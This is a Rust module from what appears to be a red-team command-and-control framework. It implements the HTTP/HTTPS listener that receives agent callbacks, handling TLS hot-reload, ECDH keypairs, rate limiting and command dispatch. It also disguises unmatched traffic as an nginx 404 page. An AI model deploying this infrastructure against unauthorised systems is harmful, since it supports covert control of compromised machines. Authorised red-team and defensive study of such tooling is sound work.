//! HTTP/HTTPS C2 listener runtime.

mod body;
mod dispatch;
mod ecdh_dispatch;
mod handler;
mod proxy;

pub(crate) use body::{
    DemonTransportKind, allow_demon_init_for_ip, classify_demon_transport,
    collect_body_with_magic_precheck, is_valid_callback_request, is_valid_demon_callback_request,
};
pub(crate) use dispatch::{DemonHttpDisposition, process_demon_transport};

// Test-only re-exports consumed by listeners::tests
#[cfg(test)]
pub(crate) use handler::is_past_kill_date;
#[cfg(test)]
pub(crate) use proxy::{TrustedProxyPeer, extract_external_ip, parse_trusted_proxy_peer};

use std::net::IpAddr;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, SystemTime};

use axum::Router;
use axum::http::{HeaderName, HeaderValue, Method, StatusCode};
use axum::response::Response;
use axum::routing::any;
use axum_server::tls_rustls::RustlsConfig;
use red_cell_common::HttpListenerConfig;
use red_cell_common::tls::{
    TlsKeyAlgorithm, install_default_crypto_provider, load_tls_identity, resolve_tls_identity,
    validate_tls_not_expired,
};
use std::collections::HashMap;
use tokio::net::TcpListener;
use tokio::sync::RwLock;
use tokio::task::JoinHandle;
use tracing::{info, warn};

use crate::listeners::{
    DemonInitRateLimiter, ListenerManagerError, ListenerRuntimeFuture, ReconnectProbeRateLimiter,
    UnknownCallbackProbeAuditLimiter,
};
use base64::Engine as _;
use red_cell_common::crypto::ecdh::ListenerKeypair;

use crate::{
    AgentRegistry, CommandDispatcher, Database, DemonInitSecretConfig, DemonPacketParser,
    PluginRuntime, ShutdownController, SocketRelayManager, dispatch::DownloadTracker,
    events::EventBus,
};

use handler::{
    DEFAULT_FAKE_404_BODY, http_listener_handler, parse_expected_header, parse_method,
    parse_response_headers,
};
use proxy::parse_trusted_proxy_peers;

// ── Types ────────────────────────────────────────────────────────────────────

pub(super) struct HttpListenerState {
    pub(super) config: HttpListenerConfig,
    pub(super) trusted_proxy_peers: Vec<proxy::TrustedProxyPeer>,
    pub(super) registry: AgentRegistry,
    pub(super) database: Database,
    pub(super) parser: DemonPacketParser,
    pub(super) events: EventBus,
    pub(super) dispatcher: CommandDispatcher,
    pub(super) demon_init_rate_limiter: DemonInitRateLimiter,
    pub(super) unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    pub(super) reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    pub(super) method: Method,
    pub(super) required_headers: Vec<ExpectedHeader>,
    pub(super) response_headers: Vec<(HeaderName, HeaderValue)>,
    pub(super) response_body: Arc<[u8]>,
    pub(super) default_fake_404_body: Arc<[u8]>,
    pub(super) shutdown: ShutdownController,
    /// X25519 keypair for ECDH new-protocol listeners. `None` for legacy listeners.
    pub(super) listener_keypair: Option<ListenerKeypair>,
}

pub(super) struct ExpectedHeader {
    pub(super) name: HeaderName,
    pub(super) expected_value: String,
}

// ── HttpListenerState ─────────────────────────────────────────────────────────

impl HttpListenerState {
    #[allow(clippy::too_many_arguments)]
    fn build(
        config: &HttpListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        downloads: DownloadTracker,
        demon_init_rate_limiter: DemonInitRateLimiter,
        unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
        reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
        shutdown: ShutdownController,
        init_secret_config: DemonInitSecretConfig,
        max_pivot_chain_depth: usize,
        allow_legacy_ctr: bool,
        listener_keypair: Option<ListenerKeypair>,
    ) -> Result<Self, ListenerManagerError> {
        let method = parse_method(config)?;
        let trusted_proxy_peers = parse_trusted_proxy_peers(config)?;
        let required_headers = config
            .headers
            .iter()
            .filter_map(|header| parse_expected_header(header, &config.name).transpose())
            .collect::<Result<Vec<_>, _>>()?;
        let response_headers = config
            .response
            .as_ref()
            .map_or(Ok(Vec::new()), |response| parse_response_headers(response, &config.name))?;
        let response_body = config
            .response
            .as_ref()
            .and_then(|response| response.body.as_deref())
            .unwrap_or_default()
            .as_bytes()
            .to_vec()
            .into();

        Ok(Self {
            config: config.clone(),
            trusted_proxy_peers,
            registry: registry.clone(),
            database: database.clone(),
            parser: DemonPacketParser::with_init_secret_config(
                registry.clone(),
                init_secret_config.clone(),
            )
            .with_allow_legacy_ctr(allow_legacy_ctr)
            .with_legacy_mode(config.legacy_mode),
            dispatcher: CommandDispatcher::with_builtin_handlers_and_downloads(
                registry.clone(),
                events.clone(),
                database.clone(),
                sockets,
                plugins,
                downloads,
                max_pivot_chain_depth,
                allow_legacy_ctr,
                init_secret_config,
            ),
            events,
            demon_init_rate_limiter,
            unknown_callback_probe_audit_limiter,
            reconnect_probe_rate_limiter,
            method,
            required_headers,
            response_headers,
            response_body,
            default_fake_404_body: DEFAULT_FAKE_404_BODY.as_bytes().to_vec().into(),
            shutdown,
            listener_keypair,
        })
    }

    pub(super) fn fake_404_response(&self) -> Response {
        let body = if self.response_body.is_empty() {
            self.default_fake_404_body.clone()
        } else {
            self.response_body.clone()
        };

        let mut response =
            handler::build_response(StatusCode::NOT_FOUND, body.as_ref(), &self.response_headers);
        let headers = response.headers_mut();
        handler::set_default_header(headers, "server", "nginx");
        handler::set_default_header(headers, "content-type", "text/html");
        response
    }

    pub(super) fn callback_empty_response(&self) -> Response {
        handler::build_response(StatusCode::OK, &[], &self.response_headers)
    }

    pub(super) fn callback_bytes_response(&self, body: &[u8]) -> Response {
        handler::build_response(StatusCode::OK, body, &self.response_headers)
    }
}

// ── Spawn / TLS ───────────────────────────────────────────────────────────────

#[allow(clippy::too_many_arguments)]
pub(super) async fn spawn_http_listener_runtime(
    config: &HttpListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    downloads: DownloadTracker,
    demon_init_rate_limiter: DemonInitRateLimiter,
    unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    shutdown: ShutdownController,
    max_pivot_chain_depth: usize,
    init_secret_config: DemonInitSecretConfig,
    allow_legacy_ctr: bool,
    tls_configs: Arc<RwLock<HashMap<String, RustlsConfig>>>,
    watcher_handles: Arc<RwLock<HashMap<String, JoinHandle<()>>>>,
) -> Result<ListenerRuntimeFuture, ListenerManagerError> {
    // For non-legacy listeners, load (or generate) the ECDH keypair so Phantom/Specter
    // agents can use the new-protocol encrypted transport.
    let listener_keypair = if !config.legacy_mode {
        match database.ecdh().get_or_create_keypair(&config.name).await {
            Ok(kp) => {
                tracing::info!(
                    listener = %config.name,
                    public_key = %base64::engine::general_purpose::STANDARD.encode(kp.public_bytes),
                    "ECDH listener keypair ready"
                );
                Some(kp)
            }
            Err(e) => {
                tracing::warn!(listener = %config.name, error = %e, "failed to load ECDH keypair — new-protocol agents will be rejected");
                None
            }
        }
    } else {
        None
    };

    let state = Arc::new(HttpListenerState::build(
        config,
        registry,
        events,
        database,
        sockets,
        plugins,
        downloads,
        demon_init_rate_limiter,
        unknown_callback_probe_audit_limiter,
        reconnect_probe_rate_limiter,
        shutdown,
        init_secret_config,
        max_pivot_chain_depth,
        allow_legacy_ctr,
        listener_keypair,
    )?);
    let address = format!("{}:{}", config.host_bind, config.port_bind);
    let listener = TcpListener::bind(address.as_str()).await.map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind {address}: {error}"),
        }
    })?;
    let std_listener = listener.into_std().map_err(|error| ListenerManagerError::StartFailed {
        name: config.name.clone(),
        message: format!("failed to convert bound socket {address} into std listener: {error}"),
    })?;
    let router = Router::new().fallback(any(http_listener_handler)).with_state(state.clone());

    if config.secure {
        install_default_crypto_provider();
        let tls_config = build_http_tls_config(config).await?;

        // Register the live config handle so hot-reload can reach it later.
        tls_configs.write().await.insert(config.name.clone(), tls_config.clone());

        // If the cert comes from files, spawn a poller that hot-reloads on change.
        if let Some(cert_cfg) = &config.cert {
            let handle = spawn_cert_file_watcher(
                config.name.clone(),
                PathBuf::from(&cert_cfg.cert),
                PathBuf::from(&cert_cfg.key),
                tls_config.clone(),
            );
            watcher_handles.write().await.insert(config.name.clone(), handle);
        }

        let server = axum_server::from_tcp_rustls(std_listener, tls_config).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTPS listener on {address}: {error}"),
            }
        })?;

        let listener_name = state.config.name.clone();
        Ok(Box::pin(async move {
            server
                .serve(router.into_make_service_with_connect_info::<std::net::SocketAddr>())
                .await
                .map_err(|error| format!("https listener `{listener_name}` exited: {error}"))
        }))
    } else {
        let server = axum_server::from_tcp(std_listener).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTP listener on {address}: {error}"),
            }
        })?;

        let listener_name = state.config.name.clone();
        Ok(Box::pin(async move {
            server
                .serve(router.into_make_service_with_connect_info::<std::net::SocketAddr>())
                .await
                .map_err(|error| format!("http listener `{listener_name}` exited: {error}"))
        }))
    }
}

/// Spawn a background task that polls a certificate file for changes and hot-reloads it.
///
/// The task checks the cert file's modification time every 30 seconds.  When a change
/// is detected it reads both files, validates the new cert, and calls
/// [`RustlsConfig::reload_from_pem`].  Failed reloads are logged as warnings and
/// the watcher continues running so the next successful write is picked up.
///
/// The returned [`JoinHandle`] should be aborted when the listener stops.
pub(crate) fn spawn_cert_file_watcher(
    listener_name: String,
    cert_path: PathBuf,
    key_path: PathBuf,
    tls_config: RustlsConfig,
) -> JoinHandle<()> {
    tokio::spawn(async move {
        /// Poll interval for modification-time checks.
        const POLL_INTERVAL: Duration = Duration::from_secs(30);

        let mut interval = tokio::time::interval(POLL_INTERVAL);
        // Skip the first (immediate) tick so we don't reload on startup.
        interval.tick().await;

        let mut last_cert_mtime = cert_mtime(&cert_path);
        let mut last_key_mtime = cert_mtime(&key_path);

        loop {
            interval.tick().await;

            let cur_cert_mtime = cert_mtime(&cert_path);
            let cur_key_mtime = cert_mtime(&key_path);
            if cur_cert_mtime == last_cert_mtime && cur_key_mtime == last_key_mtime {
                continue;
            }

            match reload_tls_from_files(&cert_path, &key_path, &tls_config).await {
                Ok(()) => {
                    info!(
                        listener = %listener_name,
                        cert = %cert_path.display(),
                        key = %key_path.display(),
                        "TLS certificate/key auto-reloaded from file"
                    );
                    last_cert_mtime = cur_cert_mtime;
                    last_key_mtime = cur_key_mtime;
                }
                Err(message) => {
                    warn!(
                        listener = %listener_name,
                        cert = %cert_path.display(),
                        key = %key_path.display(),
                        error = %message,
                        "TLS certificate/key auto-reload failed; retaining previous certificate"
                    );
                }
            }
        }
    })
}

/// Read the modification time of a file, returning `None` on any error.
pub(crate) fn cert_mtime(path: &std::path::Path) -> Option<SystemTime> {
    std::fs::metadata(path).and_then(|m| m.modified()).ok()
}

/// Read cert + key from files, validate, and hot-reload into `tls_config`.
pub(crate) async fn reload_tls_from_files(
    cert_path: &std::path::Path,
    key_path: &std::path::Path,
    tls_config: &RustlsConfig,
) -> Result<(), String> {
    let cert_pem = tokio::fs::read(cert_path)
        .await
        .map_err(|e| format!("read {}: {e}", cert_path.display()))?;
    let key_pem =
        tokio::fs::read(key_path).await.map_err(|e| format!("read {}: {e}", key_path.display()))?;

    load_tls_identity(&cert_pem, &key_pem).map_err(|e| e.to_string())?;
    validate_tls_not_expired(&cert_pem).map_err(|e| e.to_string())?;

    tls_config.reload_from_pem(cert_pem, key_pem).await.map_err(|e| e.to_string())
}

pub(super) async fn build_http_tls_config(
    config: &HttpListenerConfig,
) -> Result<RustlsConfig, ListenerManagerError> {
    let subject_alt_names = http_listener_subject_alt_names(config);
    let cert_config =
        config.cert.as_ref().map(|cert| red_cell_common::config::HttpListenerCertConfig {
            cert: cert.cert.clone(),
            key: cert.key.clone(),
        });
    let identity =
        resolve_tls_identity(&subject_alt_names, cert_config.as_ref(), TlsKeyAlgorithm::EcdsaP256)
            .map_err(|error| ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to resolve TLS identity: {error}"),
            })?;

    RustlsConfig::from_pem(identity.certificate_pem().to_vec(), identity.private_key_pem().to_vec())
        .await
        .map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to build rustls configuration: {error}"),
        })
}

pub(crate) fn http_listener_subject_alt_names(config: &HttpListenerConfig) -> Vec<String> {
    let mut names = Vec::new();

    for value in config
        .hosts
        .iter()
        .chain(std::iter::once(&config.host_bind))
        .chain(config.host_header.iter())
    {
        let trimmed = value.trim();
        if trimmed.is_empty() || names.iter().any(|entry| entry == trimmed) {
            continue;
        }

        names.push(trimmed.to_owned());
        if trimmed.parse::<IpAddr>().is_ok_and(|address| address.is_unspecified()) {
            if !names.iter().any(|entry| entry == "127.0.0.1") {
                names.push("127.0.0.1".to_owned());
            }
            if !names.iter().any(|entry| entry == "localhost") {
                names.push("localhost".to_owned());
            }
        }
    }

    if names.is_empty() {
        names.push("127.0.0.1".to_owned());
    }

    names
}
